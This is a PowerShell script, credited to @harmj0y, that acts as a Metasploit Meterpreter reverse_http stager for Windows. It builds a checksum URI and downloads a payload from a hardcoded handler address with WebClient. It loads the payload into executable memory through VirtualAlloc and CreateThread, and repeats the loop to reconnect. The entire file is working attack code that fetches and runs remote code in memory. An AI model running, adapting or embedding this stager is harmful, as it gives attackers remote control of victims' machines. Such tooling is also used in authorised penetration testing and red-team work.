#
# PowerShell windows/meterpreter/reverse_http stager 
#   (doesn't rely on shellcode)
#
# Also contains basic reconnect logic
#
# By @harmj0y
#

$code = @"
[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("kernel32.dll")] public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
"@
$charList = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".ToCharArray()

# adds up all char values of an array, mods it by 256 and checks if the result is equal to 92
function checksum8($val){
    return (([int[]] $val.ToCharArray() | Measure-Object -Sum).Sum % 0x100 -eq 92)
}

# generate a random string of length 3
function randomString {
    $output = "";
    1..3 | foreach-object { $output += $charList[(get-random -maximum $charList.Length)] };
    return $output;
}

# shuffle an array
function sort-random {
    process {[array]$x = $x + $_}
    end {$x | sort-object {(new-object Random).next()}}
}

# generate a randomized 4-character checksum resource request
# used by the Metasploit handler
function genHTTPChecksum{
    for ($i=0; $i -lt 64; $i++){
        $baseString = randomString
        $randList = $charList | sort-random
        foreach ($element in $randList)
        {
            $s = $baseString + $element
            if (checksum8($s)) { return $s }
        }
    }
    return "9vXU"
}

# connect to the HTTP handler and return the downloaded payload
# returns $null if the handler can't be reached
function getData {  
    # create a new web client object and add in the same user agent as the Meterpreter payload
    $userAgent = "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)"
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("user-agent", $userAgent)
    $checksum = genHTTPChecksum
    # try to download the payload and ignore any errors 
    try{[Byte[]] $payload = $wc.DownloadData("http://192.168.30.129:80/" + $checksum)}
    catch{}
    return $payload
}

# inject the shellcode using the common approach
# as long as the shellcode isn't null
function inject($shellcode){
    if ($shellcode -ne $null){
        $ptr = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru
        # standard virtualalloc/copy/create thread pattern
        $x=$ptr::VirtualAlloc(0,$shellcode.Length,0x3000,0x40)
        [System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, [IntPtr]($x.ToInt32()), $shellcode.Length)
        $ptr::WaitForSingleObject($ptr::CreateThread(0,0,$x,0,0,0), 0xFFFFFFFF) | out-null
    }
}

# reconnect logic
$reconnects = 0+1; $reconnectInterval = 30;
while($reconnects -ne 0){
    inject(getData);
    Start-Sleep -s (Get-Random -minimum (.7*$reconnectInterval) -maximum (1.3*$reconnectInterval))
    $reconnects -= 1
}

